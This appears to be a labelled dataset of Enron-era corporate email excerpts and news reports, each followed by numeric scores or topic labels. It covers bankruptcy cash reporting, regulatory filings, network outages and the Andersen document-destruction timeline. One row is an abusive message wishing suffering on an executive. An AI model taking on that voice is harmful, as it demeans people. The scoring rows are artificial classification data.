transactions, but the accounting firms have never believed c=onsulting fees compromise their objectivity. ""They have militantly refused =to ever acknowledge the possibility of a problem,"" Longstreth says.",0.0,0.0,0.8,0.6

The goal: a system to providereal-time flow of short-term prices and a way to track investors andcompeting issuers. At the time, the global automaker and long-time directCP issuer saw the possibilities as interesting, but not necessarily apriority.All that changed two months later, when DaimlerChrysler's CP was downgradedto A2/P2. Suddenly, big money-market funds, which once constituted 85% ofDaimlerChrysler's market, were no longer buyers. Nickoley had an immediateneed to figure out what other buyers existed out in the market to taketheir place, but it took her a day or two to get investor information outof the mainframe-based system she used to manage CP issuance.In October, the kind of capability Nickoley sought finally became availablewith the introduction of Prescient Funding Desk. Now we know for allcustomers what time of day they trade, what size of trade they normally do,if they come in through cpmarket or on the phone, says Nickoley. Thecustomer analytics was the key.With the development of Funding Desk, companies can get information onprices, including fluctuations in competitors? CP rates and what investorsare looking for in the market on a real-time basis. Funding Desk's pricingmodule provides short-term market rates from Prebon Yamane and CP ratesfrom cpmarket.com, Prescient?s online platform for direct issuance of CP.In Tune with MarketThe advantages? Trades done on cpmarket.com flow automatically into FundingDesk, and Prescient says it is working on a link with Bloomberg that willbring in data on trades done on Bloomberg's CP platform. Companies can saveon funding costs by using the data to target less yield-sensitiveinvestors. They can also save money by knowing when competitors move ratesand then matching those moves. Using Funding Desk, we're much more in tuneto whether pricing is changing in the market, DaimlerChrysler's Nickoleysays. Besides cost savings, issuers may simply want to keep tabs on theirinvestors to ensure that no one investor holds too large a chunk, in orderto lessen the risk of having to scramble to find other buyers if a biginvestor exits suddenly.",0.0,0.0,0.7,0.2

I think the diagnostic measure should be, for each commodity DPR a report daily of all those signed off as final (note I do not neccessarily mean ""officialized"") after the relevant market opening time (usuaully 7.30 am)Timely confirmation and execution of transactions (completeness, accuracy, existence)Monthly report of all unmatched confirmations:- outstanding inward confirmations (i.e. sent out, not signed) - outstanding outward confirmations (i.e deal done, confirm not sent) - outstanding mismatched or disputed confirmationsshowing deal trade date, start date, commodity, counterparty, MTM value, agedSettlements with counterparties occurs accurately and timely (non CACS, non Dashed deals)Monthly report of cumulative amounts of all unmatched or unapplied cash:Unapplied cash by counterparty, in original denomination, including deal reference if anyUnmatched amounts by deal, where settled amount differs from maturing forward MTM valueOne additional thing that ocurred to me was the fact that those responsible for supplying the information are also those responsible for the operation underlying it in some sense, so the obvious pitfalls of self - assessment will come into play here.

You are a disgrace to the human race and I hope that you and your kind suffer the kind of punishment you really deserve.While you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.

The template should be sent to you prior to the meeting.  -----Original Message-----Subject:CASH & REORG FINANCIAL REPORTING FINANCIAL REPORTING REQUIREMENTSMany people have questions regarding how Enron will be operating under Chapter 11 bankruptcy proceedings. This memo addresses the financial reporting requirements Enron will have to its various constituents. During the reorganization, the Company will continue its GAAP reporting, with a breakout of pre and post petition liabilities, as well as historical management/operational reporting, consistent with past practices.In addition, the Company will have an added responsibility to report cash flows to the bankruptcy court and its various constituents. Specifically, Enron will be required to report projected cash receipts and cash disbursements by business unit on a weekly basis. The court and our new debtor-in-possession (""DIP"") lenders require a rolling 13 week projection of cash flows plus monthly projections thereafter to obtain a full year of projected cash flows. The budgeted weekly projections will then be compared to actual results to determine how well each business unit is operating compared to the projections. The weekly and monthly forecasts will be adjusted each week pursuant to revised or improved information on forecasted cash flows. Thus this process will be an ongoing one, with constant updating of information to ensure we generate the most accurate reports possible.The initial weekly and monthly projections will be critical to the determination of the amount that the DIP lenders will be willing to make available to the Company. In addition, the cash flows for the entities that are included in the bankruptcy proceedings will be utilized by the bankruptcy court and DIP lenders to constantly review and react to the cash flow situation at Enron. However, all Enron business units (not just ones in bankruptcy) will need to conform to these new requirements, because additional entities are likely to be included in the bankruptcy filing and because it is extremely important for Enron management to be able to see the totality of cash flow requirements for the entire Company.The weekly cash flow projection project will be overseen by Mike Deville (x 57852) and Greg Adams (x 33887). In addition, Enron has retained Batchelder & Partners, Inc., a financial advisory firm, to assist us in this and other reorganization efforts.We will be having a group meeting with the CAO's and/or their designees from the various business units responsible for the cash projections on Wednesday, December 5 at 2:00 PM in the Boardroom on the 50th floor to further explain this process and answer any questions you may have. We will then be meeting on an individual basis with the business units to discuss specific business unit requirements.",0.0,0.0,0.7,0.3

Most of the discussion was regarding the NOPR on Allowance of Partial Day Recalls of Released Capacity. This would be a possibility only for LDCs. Comments should be submmitted around Nov 19. It was considered disruptive for the market. Discos argue they need this possibility in order to increase reliability. The problem is that the release capacity would be less attractive if distcos are given this possibility (the value of release capacity would be lower than IT). It was mentioned that this could lead to the use of daily balancing. The main fear is that State Commissions could order Discos to keep the recall right in their release.
They plan to talk to INGAA about this issue and said they would appreciate any feedback to talk to INGAA.

On other issue, it was mentioned the due date for comments about the Affiliate transaction NOPR was moved to Dec. 20.

The next conference call will be December 4 (Tuesday) at 3:30 pm.

""What we found was appalling,"" Powers told lawmakers in his opening testimony to the House Financial Services Committee at a hearing into Enron's collapse. 
""First, we found that Fastow, and other Enron employees involved in these partnerships, enriched themselves, in the aggregate, by tens of millions of dollars they should never have received,"" Powers charged. 
Andrew Fastow formerly worked for Enron up until last autumn as the company's chief financial officer. 
Powers was hired in October to head up a Special Investigative Committee of the Enron Board of Directors. Powers released his findings in a 218 page report over the weekend. 
The law professor told lawmakers that he found evidence of transactions that were ""improperly structured"" and that he also discovered ""a systematic and pervasive attempt by Enron's management to misrepresent the company's financial condition."" 
""There's no question that virtually everyone, from the board of directors down, understood that the company was seeking to offset its investment losses with its own stock,"" Powers said. 
He said stressed that 70 pct of the failed energy firm's earnings from the third quarter 2000 through to the same period in 2001 ""were not real."" 
""There was misconduct by Fastow and other senior employees of Enron. There were failures in the performance of Enron's outside advisors (Arthur Andersen LLP). And there was a fundamental default of leadership and management,"" Powers added.

Subject:        Additional Information for your Trip to ALbuquerque and the Balloon Fiesta 



Holden, thanks for accepting our invitation to the Albuquerque International Balloon Fiesta!  You'll have a great time. 

As promised, I am enclosing additional information on making your trip here October 7-9, 2001.  I will also be needing some information from you.

1.  Please email me, call me or fill out the attached form and fax it back to me with your travel information as soon as you know it, so we can arrange times to meet you at the airport. 

2.  In October, Albuquerque can be very cool.  Please bring a light jacket and/or sweater, and some warm clothes, as many of the events we will be hosting are outside.

3.  You will be lodging in a Class a RV on site at the Balloon Fiesta, with one of our other guests.  There will be 3 RV's that we have secured for our guests (6 guests in all), and these RV's will be parked in our own reserved area of the Balloon Fiesta.  This way, there will be no ""early rising"" to attend balloon events, as some of the start times for ascension events are 5:45AM - 7:00 AM!  And you will be in midst of all of the excitement.  These RV's are top of the line: roomy, comfortable, and well-stocked with all the necessities (snacks, drinks, toiletries, sheets, blankets, towels).

4.  All meals will be hosted by us, either at local restaurants or they will be professionally catered to our area. 

We will also host an outing to Santa Fe; sightseeing and museums, or you can play golf instead (please indicate in your reply if you will be renting clubs or bringing your own).    We would also like to treat you to a balloon ride (weather permitting) if you are so inclined.  Just please note it on the attached sheet.

And last but not least, we would like you to provide us with your sweatshirt size so we can send you home with an official Balloon Fiesta sweatshirt.

I have attached to this email a form that you can either fill out and fax back to me or use it as a guide to answer all the questions that I am requesting through email.  Of course, you can still call me at 505/855-6202.  If you plan to fax this in",0.0,0.0,0.8,0.0

Parties to the PG&E Gas OII Settlement:

On June 13th, PG&E held a workshop to discuss proposed tariffs to implement
the Comprehensive PG&E Gas OII Settlement Agreement.  At that meeting,
parties raised various issues concerning the draft tariffs we distributed on
May 25th.  Attached please find PG&E's proposed response to those issues,
other than metering issues which we will address next week.  In addition, we
have included changes to the non-metering draft tariffs from the version we
distributed on May 25th.

We encourage you to provide us with comments on these drafts by Friday, June
30, 2000.  We will host a half-day workshop on any unresolved issues on
Thursday, July 6, at 1:30 p.m., in Room 301b, 77 Beale Street, San
Francisco.

We will provide a response to the metering issues on Wednesday, June 28th,
and will host a half-day tariff workshop on these issues on Friday, June 30,
starting at 10:00 a.m., in Room 301b, 77 Beale Street, San Francisco.

Thanks for your help in finalizing these tariffs for our July 17 compliance

As I read the memo below, I am instructed to advise you about the nature of the underlying asset. The asset is Series B Preferred Stock of Catalytica Combustion Systems, Inc., and an option to acquire same. Currently, pursuant to a Series B Stock Purchase Agreement among Catalytica Combustion Systems, Inc. ( CCSI), Catalytica, Inc. ( CCSI's parent and currently holder of Series A and common stock of CCSI representing approximately 83% of the ownership of CCSI ) and Enron Ventures Corp. ( predecessor in interest to Sundance Assets, L.P.), Sundance owns 1,339,286 shares of Series B Preferred Stock and an option to purchase 535,715 shares of Series B Preferred Stock. There are provisions calling for the adjustment of the number of option shares subject to the option but I am not aware that any transactions that would cause such adjustment provisions, other that the stock split referred to below, to apply. The Series B stock is convertible to CCSI common stock, is restricted stock, and the Stock Purchase Agreement provides for registration rights. Currently, Tom White and Jack Urquhart both serve on the CCSI Boards of Directors, and Jack serves on the Catalytica Inc. Board.Under an Omnibus Agreement entered into in September 2000, in connection with the restructuring of Enron's transactions with CCSI and in connection with the proposed acquisition of Catalytica, Inc, by a third party ( DSM, a Dutch pharmaceutical company) and the distribution of Catalytica's CCSI shares to Catalytica's stockholders immediately prior to that acquisition, we agreed to convert the Series B to CCSI common, agreed to vote for a 2 for 1 stock split, and negotiated a cashless exercise of the option after the effective date of the spin off. The effectiveness of these provisions is dependent upon the effectiveness of distribution and acquisition The option itself ( as amended by the Omnibus Agreement and otherwise ) expires January 14, 2001. The distribution is expected to occur in the fourth quarter of 2000, but is subject to a variety of conditions. After the distribution and concurrent closing of the Catalyica acquisition transaction, CCSI ( which formerly looked to its parent for financing and much of its administrative and other support) will be a stand- alone public company listed on NASDAQ, with the uncertainties attendant thereto.",0.0,0.0,0.7,0.2

I agree that the process must be enhanced because it leaves some room for errors because each Risk person is responsible for checking his or her own inputs. The existing procedures do not have a backstop in place for catching volumetric errors. We will have an additional ""check"" in place if the traders and the Risk group arrive at the same net new deals positions from independent sources.The following spreadsheet describes our existing process. The only addition to the procedures is the last section on Deal Entry. That section describes the new standardized Notebook and the deals to be entered by Risk.The new procedures that are being put into place include the following:1. All traders will use a standardized notebook for writing up their financial trades;2. The traders will no longer be entering their own financial deals;3. The traders will keep an electronic record of the volumes traded through the broker market that will then be consolidated with the EOL trades done. This net position should tie out to the net position entered into the system by Risk.

Steve, thanks for the helpful materials. However, if the experience in 
overseas deregulating electricity markets where price increases and spikes 
have occurred is any precedent, we will need to have some more down-to-earth 
responses to a some of the potentially inflammatory issues facing the 
politicians:
    1. When the prices spike, who reaps the windfall? Who sells that most 
expensive 1% of the kwh? Is it a careful planner or a lucky speculator or 
market manipulator? Someone is making a bunch of money off the screwed up 
system. Who is it, and why is that OK?
    2. We do not allow people to inflate water prices to consumers in times 
of drought, or food prices in times of hurricanes or floods. Even gasoline 
price increases in periods of high demand are within 20%-30% of the base, not 
2,5,10 or 100 times the average like spot electric prices. The issue isn't 
whether the system is broken or not or how bad partial regulation is or how 
much demand has increased versus supply. Thes will be seen as ""ivory tower"" 
discussions. The populist political issue is, until the problem is fixed, why 
should some shrewd big electric company or middleman be allowed to profit off 
the misfortune of consumers who did not cause the problem? Why should anyone 
be allowed to profiteer by selling at multiples above their generation cost?
    3. The hedges, fixed price contracts and other de facto insurance against 
volatility that Enron or others offer could be seen as a symptom of the 
problem rather than the solution.  Enron could be seen as at best a band aid 
and at worst an opportunist made possible only by a broken system - - -sort 
of like the guys who ran the old style protection rackets, or Colombian 
""security consultants"" who ""guard "" pipelines from the threats their guerilla 
afiliates create, or  political risk insurance that you shouldn't really need 
if the host country wasn't so screwed up. Don't worry about high crime in 
your neighborhood -  - - just hire an off-duty policeman.   Who needed these 
new electricity risk management products in the old days before deregulation? 

    We have to be able to answer these types of questions at the level of the 
ordinary citizen, not merely have the correct long-term competitive market 
solution, or the forces of ignorance and re-regulation will gain momentum.

In some instances you will have onecopy of a document that has your handwritten notes on it, and another copythat may be clean. For these purposes both are considered documents andboth must be saved. Similarly, if several people have copies of the samedocument, each separate copy is considered a separate document. On theother hand, if you made 10 copies for a meeting and there were 4 left overthat were never handed out or were not used, those may be recycled so longas you keep the ones that were used. If you keep handwritten notes foryour work, those would be considered documents as well. Telephone notes,charts, printouts of data, spreadsheets etc. all constitute documents. Ifyou have a question about what constitutes a document and whether it shouldbe saved, please ask Christian Yoder and Steve Hall.3.

Subject: IT problems Sunday

Tim and Murray,

Yesterday the real-time desk experienced dropped Terminal Server (TS) 
sessions which impacted their productivity. Diana and Chip contacted the 
network team in Houston to assist with troubleshooting the problem. Keith 
Dziadek monitored the DS3 VPN connection between Portland and Houston and has 
determined that it is the dynamic fail-over within the Enron Intelligent 
Network (EIN) which is causing the dropped TS sessions. This dynamic 
fail-over is a good thing. Our issue is that the sensitivity of the TS 
sessions is so high that the time of the dynamic fail-over on the EIN causes 
them to drop while all other applications (i.e. Enpower running locally in 
Portland) are not affected.

Keith is meeting with his team in Houston as well as staff from EBS today to 
form an action plan. Once the action plan has been established, Keith or I 
will communicate what and when it will be done to you via email.

You can reach me on my cel if you have any questions.

Regards,

Dan Dietrich

Please be advised of a serious problem with Terminal Server! 

We were all kicked out of Terminal Server consistently on Sunday.  At first 
it happened about every half hour (9am to 10:30a.m).  Then it happened every 
5 minutes. 
Communication seemed slow.  We paged and called the Portland IT Team at 
on it.   At around  12:30 Paul Kane called back and said ""Vince"" in Houston 
was working on it.  We asked for Vince's Phone number and Paul stated that 
Vince would call us instead. Vince called at about 1:00 and said everything 
was now working.  Five minutes later we were still getting kicked out.   We 
then paged and called Chip and he said he was trying to get ahold of 
Houston.  At 1:30 we called the Resolution Center. They indicated they had no 
clue we were having problems. At 1: 45 we called Greg Marsalis in Houston and 
he said he was unaware of who was working on it, but was going to look into 
it.

Greg did look into it and said they were still not able to pinpoint the 
problem.  At this writing,(3:10p.m.) we are still not able to use Terminal 
Server ",0.0,0.0,0.8,0.2

The data request was unusual in the type of information it asked for, and for the most part, Enron's internal systems did not track the information in the format requested. Since the pending lawsuit involves a large amount of money, it was imperative that (1) the data be pulled together, even though our internal systems did not track this type of information in a format that was readily accessible; (2) the data be as accurate as possible, and; (3) it be done in a very short period of time.The amount of data we were asked to review and pull together was massive. Utilizing Cara's comprehensive, and fairly unique understanding of our scheduling and accounting systems, we were able to accomplish this task. There were many instances where we hit a ""brick wall"". Specifically, it was difficult to match information from our scheduling dataset with our accounting dataset, although it was imperative we do so. Cara was instrumental in bridging this gap.As a result of her efforts, we were able to hand a quality set of data to our consultants in DC, and subsequently for our FERC filing.

Alan/Harry,

I can't remember which of you two lucky souls are looking after coal.

We have modified the Coal Products somewhat. 

Previously, we showed Product Types for US Coal Nymex Phy Fwd, US Coal 
PRB8400 Phy Fwd and US Coal PRB880 Phy Fwd.
We are in the process of replacing this with a single Product Type: US Coal 
Phy Fwd, which has various delivery locations. This is more of a logical 
change than anything else, and the long descriptions have been edited only 
slightly from what was there before. Please review the following and let us 
know if it meets your approval.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"NEW YORK -- Enron Corp. shares Monday sank to a low not seen since the 1987 stock market crash, as investors continued to mark down the chances of the energy trader's completing its pending buyout by rival Dynegy Inc. Enron stock tumbled 70 cents, or 15%, to $4.01 on the New York Stock Exchange. Dynegy fell $1.15, or 3%, to $39.25 on the Big Board.The pressure on Enron is mounting not just from Wall Street but from regulators, bond-rating agencies, the energy trading community and Enron's own employees, many of them angered by the devastation of their retirement accounts as the company's stock has plunged 95% this year. An employee lawsuit was filed Monday in federal court in Houston, alleging that Enron misled workers about its profitability and breached its fiduciary duty by inducing them to buy company stock for their 401(k) retirement plans. About 15,000 Enron employees are owed a total of $890 million in compensation for losses sustained in their retirement accounts, said Eli Gottesdiener, whose Washington firm represents the plaintiffs. One of the plaintiffs, Gary Kemper, a maintenance foreman with Enron's Portland General Electric unit in Oregon, said the total value of his 401(k) account has shrunk to $129,000 from $317,000 this year as his Enron holdings collapsed to about $9,000 from $197,000. ""It wouldn't tick me off so bad except that they were sending us e-mail after e-mail [last summer] saying things are fine,"" Kemper said in an interview Monday, referring to company executives. ""Of course, we find out later that they were dumping their own stock, millions of dollars at a time."" Enron Chairman Kenneth L. Lay cashed in stock and options worth $123 million last year, when the stock was near its peak. Kemper and his wife had been planning to retire early, four years from now, but it is no longer clear that they will be able to afford it, he said. Another law firm representing Enron employees, Seattle-based Hagens Berman, is looking into the possibility of adding Enron's accounting firm as a defendant, partner Karl Barth said Monday. The accountant, Andersen, has been criticized for failing to catch irregularities that caused Enron to restate its earnings dating back to 1997 and declare its previous financial reports unreliable. Egan-Jones Ratings Co., a credit-rating agency in suburban Philadelphia, on Monday cut its rating on Enron's senior debt by one notch, saying the company will need $1 billion to $1.5 billion in the next 45 days to fund operating losses and other liabilities. Egan-Jones dropped Enron's bonds to the sub-investment-grade, or junk, level in August, about when the company's chief executive, Jeffrey K. Skilling, abruptly resigned. The agency's view is more severe than those of larger rivals Moody's Investors Service and Standard & Poor's, which both continue to keep Enron's debt in the investment-grade category.",0.0,0.0,0.9,0.2

S&P cut four Enron credit-linkedissues valued at about $1.36 billion combined to ``BBB'' from``BBB+'' and indicated it may lower the grades again. Fearing that an Enron collapse might cripple the natural gas-derivatives market, oil and gas producer Apache Corp. said itbacked out of most of its gas hedges, realizing a $70 million gainso far. ``We have been unwinding our hedge positions because ofuncertainty created by Enron's credit problems,'' Apache spokesmanBill Mintz said.

It was only a dozen years ago (March 14, 1990) that Mikhail Gorbachev was
elected to the presidency of the USSR, but it already seems an eternity,
considering the tremendous changes he unwittingly set off by his efforts
to modernize his regime.

When I was living in Moscow as a correspondent in the early seventies, no
one had the slightest idea that the entire communist edifice could collapse
as rapidly as it did after Gorbachev's well-intentioned tinkerings.

In those days the best brains of the West were expending a vast amount of
imagination (not to mention cold cash) trying to elucidate the mysteries of
the inner circles of power behind the great brick walls of Red Square. The
political science of choice was then known as Kremlinology.

Moscow was the capital city not of what we call Russia today, but of the
USSR -- the Union of Soviet Socialist Republics -- and most of the Russian
language words with which we were familiar were derived from the
Marxist-Leninist ""newspeak"" which dominated everyday life, and which George
Orwell had caricatured with such devastating accuracy in ""Animal Farm"" and
""1984.""

Over the last dozen years an entirely new vocabulary, reflecting the
realities of the new, semi-democratic state, has consigned the old
political jargon to the dustbin of history. But let us not forget that
long before either of these Ivan-come-lately regimes had appeared on the
world stage, a third set of politico-economic realities had spawned a far
greater culture with its own rich vocabulary for our borrowing -- the
eternal Russia of Tolstoy, Dostoyevsky, Gogol, Turgenyev, Chekhov and
many others. This sampling of Russian words dips into all thr",0.0,0.0,0.7,0.0

Oct. 9, Andersen hires an outside law firm to advise the firm amid its growing concern about the Enron account, indicating Andersen was becoming concerned about its legal liability. Oct. 12, Temple sends an e-mail to an Andersen executive, who forwarded it to Duncan, in which the Andersen attorney says: ""It might be useful to consider reminding the (Enron) engagement team of our documentation and retention policy. It will be helpful to make sure we have complied with the policy."" The policy addresses ""organization, retention and destruction"" of client information. Also Oct. 12, Duncan receives a draft press release from Enron in which the company plans to describe its $1 billion charge against income as a nonrecurring item. Three days later, Duncan sends a memo to ""the files"" outlining his Oct. 14 discussion with Enron Chief Accounting Officer Rick Causey. Duncan voiced ""strong concerns"" that describing the charge as nonrecurring ""could be misconstrued or misunderstood by investors."" Duncan also noted that he informed Causey that Andersen was aware of enforcement actions undertaken by the Securities and Exchange Commission ""in cases where they believe such a presentation was materially misleading."" Oct. 15, Enron issued a press release describing the charge as nonrecurring. Oct. 16, Temple sends an e-mail to Duncan advising him to delete her name from the memo about Andersen's concerns about Enron's handling of the third-quarter press release. ""Reference to the legal group consultation arguably is a waiver of attorney-client privileged advice and if my name is mentioned it increases the chances that I might be a witness, which I prefer to avoid."" Around Oct. 19-20, Duncan learns the SEC has launched a formal inquiry of Enron's financial records and reporting. He informs the Andersen consultation group, which includes Temple. Oct. 22, Duncan and the Andersen auditing team meet with Causey, Enron's chief accounting officer, to discuss the SEC probe. Oct. 23, Duncan convenes an ""urgent meeting"" of the Enron auditing team, at which he organizes a concerted effort to destroy a ""significant"" number of documents of interest to SEC and congressional investigators, Andersen executives testify. Oct. 24, Enron fires Fastow, its chief financial officer. Oct. 25, Enron issues a notice advising that preservation of documents is required by law, given that the company was being sued by investors.

I am attaching my Excel spreadsheet that takes you through the various iterations of the capital expenses and cost-of-service calculations for the Elba Island LNG Terminal.  I have included certain ""estimate"" information that reflects my attempt to derive cost-of-service information to augment what Southern LNG has provided.

Rod Hayslett has kindly agreed to develop the proper algorithm to more accurately calculate this information and to work with Eric Groves on integrating this as a module in Eric's LNG economic evaluation model for the Atlantic Basin.  I believe we will need this in order to analyze the proposals that we expect to receive from El Paso Merchant Energy this week.

I would also like James McMillan to take a look at the commodity charges and electric power rates for the nitrogen injection, air injection and gas liquids stripping cases, as well as at the fixed O&M costs.  Some updating of the ""estimate"" information is likely needed.

I will send copies of the relevant background information received from Southern LNG to each of you.  In addition, I will be sending out a general memo to a wider audience with the attached spreadsheet.

Hi Doug:
Hope all is well.  Congratulations to you folks on your agreement with
the PUC.  Must be a relief.

 I was writing to get your reaction to the judge's proposed order in the
El Paso case.  You think the Commission is likely to adopt it?  Change
it?  Judge's proposal fatally flawed on the market power issue?
Appreciate your insights.

AND did you hear Bilas issued the our gas settlement as his proposed
decision for adoption by the Commission at its 10.25.01 meeting!?!?!
What next?

Best,
Jeff

James:

As discussed, you will update this information with Rod Hayslett, in specific regard to the ""estimate"" information that I have generated.  I do not wish to change any of the rate data provided by Southern LNG in the excel spreadsheet, although your comments as to specific areas of concern are most helpful, as I expect Southern LNG to come forth with a number of changes at the time of their ""True-Up Filing"" with the FERC (October 2001 or so).

We talked about the additional costs of the docking pilots on the standby tugs (versus your estimate).

We talked about certain costs that you are going to check with El Paso Merchant Energy (maintenance dredging).

We really have two stripping alternatives - I have shown only ours, as adjusted.  However, I agree with the need to reflect the proposal advanced by El Paso Merchant Energy.  Please work with Rod Hayslett on setting up this alternative in the spreadsheet.

The reason to have Rod develop the model is so we can quickly calculate what the cost-of-service impact will be for various capital projects and, hence, what the comparative economics are.

Regards.

Les,

I have the following comments on your attached Cost of Service Model:

Assume that AFUDC is essentially ""Interest during Construction,"" at a rate of 10%.
Suspect that $9,739,130 Stabilization (Air or N2) Cost provided by Southern LNG on April 3, 2000 does not include spare parts, which would increase parts by about 2%, i.e. $195,000.  This system would also increase O&M Costs: Fixed Cost - 0 (assume no increase in staff); Variable O&M - $100,000 (Swag for Maintenance Cost);  Electric Power by $530,000 per year (6000 hp operating 1/3 of time) 
Question to SLNG, does their $2,450,000/hr Variable O&M include maintenance dredging of the Dock & Turning Basin?
August 2000 - same comment on spare parts as item 2 above, increase Spares by 2% times incremental capital cost:  $300000/yr for 3.8% Air and $440,000 for N2 injection
FERC Environmental SWAGs for Capital Cost look OK.  Assume your $2,750,000 Fixed O&M Cost is for Maintenance Dredging; camera maintenance will be negligible  Spare parts would only apply to camera surveillance, which is negligible.
Stand by Tugs cost does not include standby tug pilots.  Add another $200,000 (SWAG) per year for them.

Sunday, November 26, at approximately 10:30 CST, EIGRP (routing protocol) 
neighbor connections between the Portland router and the Houston router began 
to timeout.  The frequency of this occurrence was mentioned in the previous 
email from Phillip Platter.  The problem cleared up at 16:56 CST.  When 
debugging the problem, all test results pointed to a problem on the EIN.  
However when the EBS NOC was contacted, they informed us that there had been 
no known network issues or scheduled changes.  Because of what I experienced 
while debugging, I had an EBS network engineer come to my office this morning 
to  walk thru the historical log data of physical devices within the Houston 
to Portland path.  The problem was finally pinpointed to an EIN DS3 link .  A 
GSR router to which this link was attached was losing OSPF neighbor 
connections with it's peer on the other side of the link due to a bouncing 
interface, thus causing the EIGRP neighbor connectivity errors.  

Realizing this is a critical link on which 24x7 trading is conducted, the 
following actions items will be addressed:
? We will be implementing our own monitoring device (currently only able to 
monitor up/down/response time) on the edge of the EIN in an attempt to more 
proactively monitor the path being utilized.  
? I will verify with EBS that all appropriate devices are being monitored by 
the NOC and that a notification process be implemented (should include both 
problem and change notification).
? I will push the issue of gaining access to the EIN edge router.  This will 
allow us to more efficiently troubleshoot/manage/monitor EIN link status and 
errors.  Knowing the error type and frequency will allow for quicker 
determination on severity and, therefore, implementation of secondary 
solutions.



Arshak,
Because of the following concerns, it appears to me that the NOC is not 
appropriately monitoring EIN devices and, in return, negatively impacting 
Enron business.  I am copying you on this note because I need your assistance 
in identifying a contact for the NOC in which to communicate these concerns 
and to work with in implementing processes to help alleviate future issues.

Concerns:
? Time required to fix this problem (6.5 hours - I think it finally cleared 
up on its own)
? The lack of notification or knowledge on the problem
? The erroneous information being communicated to the customer (Enron Net 
Works) .

This looks like we are going to be in a long pissing match with Edison.  It would be very helpful to know what our position is with DA customers before Cal Push 1 and Cal Push 2 going forward.  I know that this is probably a pain, but it seems like that's information that we need to know.  Also, it appears that Edison is under the opinion that we were short a call option to them during the ctc recovery period.  Edison gets to keep positive ctc's while they get to recover negative ctc's from esp's.

jeff d., what does edison say to the point that they got to keep positive ctc's and are now attempting to amortize negative ctc's?

Subject:	Update:  Meeting w/Edison RE: recovery of Negative CTC Claim

?	We met with Edison yesterday in the attempt to settle our negative CTC claim.
?	Edison continues to take a very hard-line, extreme position.  This is it in a nutshell:
1.	all customers--bundled and DA alike--""contributed to Edison's undercollection"" and all customers must pay it down; 
2.	bundled customers contributed through frozen rates and DA customers contributed through the negative CTC;
3.	Edison says it will pay ESPs past due amounts related to the negative CTC, but it intends to then turn around and assess a charge on all customer bills--DA and bundled alike--to recover its undercollection. 
4.	Edison intends to collect it over approximately 2 years.  Edison estimates that the charge to DA customers over this period would be about $25-27/MWH.
5.	Under Edison's plan, Enron would likely end up paying Edison, i.e., the present value of the ""undercollection"" charge would exceed the present value of the lump sum negative CTC payment.
?	Obviously, with respect to any settlement with Edison, we're extremely far apart and we're therefore considering other 	options.
?	In the meantime, the California PUC is engaged in DA and PX credit-related activities beginning next week and Edison 	will try to get the Commission to adopt their proposal.

The value of the metro fiber depends on who laid the fiber and with whom the fiber interconnects, said a source who deals in telecom assets. Buyers will be put off by the fact that some of Enron's fiber was bought from now bankrupt carriers. 
Turning to operational assets, Enron says it is selling ""a world-class IP network designed for high quality, high bandwidth delivery and applications services."" 

'World-Class' Sometimes A Misnomer 

In the telecom sector, ""world-class"" doesn't necessarily mean the network works, said a former Enron Broadband Services executive. Despite such claims by telecom carriers, they all have quality problems, including Enron, he said. 
Enron's record with prospective network customers certainly isn't an endorsement of its quality. Blockbuster Inc. (BBI) backed out of its video-on-demand deal with Enron, saying Enron's network had too many glitches. Enron and Microsoft Corp. (MSFT) are in litigation regarding a deal for the EBS network to carry MSN's latest high-speed broadband services. 
A number of former Enron telecom technicians say the construction of the company's networks was hampered by its financial accounting. In order to keep expenses down, equipment wasn't installed on a circuit unless the circuit could generate revenue. 
That approach sounds economical, except for the fact that Enron already had bought thousands of pieces of equipment. 
Although the Enron spokesman said he thinks it is all new equipment, it is more likely to be unused rather than new. Since Enron started drastically cutting its broadband expenditures last summer, it probably hasn't been buying equipment lately. 
Telecom technicians who looked at the equipment list said that a lot of it is at least two to three years old. Much of it had a useful life of 18 months, said one technician. 
Cisco Systems Inc. (CSCO) might be a prospective buyer for some equipment. Last year, the equipment maker was reported to be buying Cisco brand equipment from liquidators who had acquired it from bankrupt companies. Cisco reportedly destroyed the equipment to keep it from competing in the marketplace with new equipment.

record keeping accounting practices,1,"WASHINGTON -- Arthur Andersen LLP officials discussed Enron Corp.'saggressive accounting practices and potential conflicts of interest at aFebruary 2001 meeting called to decide whether to retain the energry-tradingcompany as a client, an internal memo from the accounting firm shows.  A second memo, cited by congressional investigators, shows that an Enronexecutive who warned the company's chief executive that it was in danger ofbeing swamped by accounting irregularities also voiced concerns to Andersen inAugust 2001.  The first memo -- drafted Feb. 6, 2001, by an Andersen auditor on the Enronaccount named Michael Jones -- recounts a meeting the day before of Andersenexecutives about whether the accounting firm should continue working for Enron.Such a ""retention meeting,"" as the memo calls it, isn't unusual in itself. But,the memo recounts the executives discussing many of the alleged problems thathave become the focus of criminal, civil and congressional investigations intoEnron's collapse. Enron, of Houston, filed for bankruptcy-court protectionunder Chapter 11 of the U.S. Bankruptcy Code on Dec. 2, the largest such filingever, and investigators increasingly are focusing on Andersen's role.  ""Significant discussion was held regarding the related-party transactionswith LJM, including the materiality of such amounts to Enron's income statementand the amount retained `off balance sheet,' "" the memo says, referring to aprivate partnership that kept Enron debt off the company's books. The memospecifically mentions ""conflicts of interest"" by then-Enron Chief FinancialOfficer Andrew Fastow, who controlled that partnership and others like it, andthe fact that he received compensation from it.  Such partnership arrangements contributed greatly to Enron's collapse.Widespread publicity of them last fall caused a crisis of investor confidencein the company that helped drive down the company's stock. Written eight monthsbefore Enron's downward spiral began, the memo raises nearly every accountingissue that led to the energy-trading company's downfall, including its need tomaintain a high credit rating. Decisions by rating agencies to downgradeEnron's rating were followed soon after by the company's bankruptcy filing.  The memo describes discussions of how the partnership transactions weredescribed in footnotes in Enron financial statements and mentions efforts tomake sure Andersen auditors ""fully understand the economics and substance ofthe transactions."" Another ""significant discussion"" was held about how Enronvalued its earnings on such transactions and ""the fact that it was `intelligentgambling.' "" The memo notes that Enron was ""aggressive in its transactionstructuring.

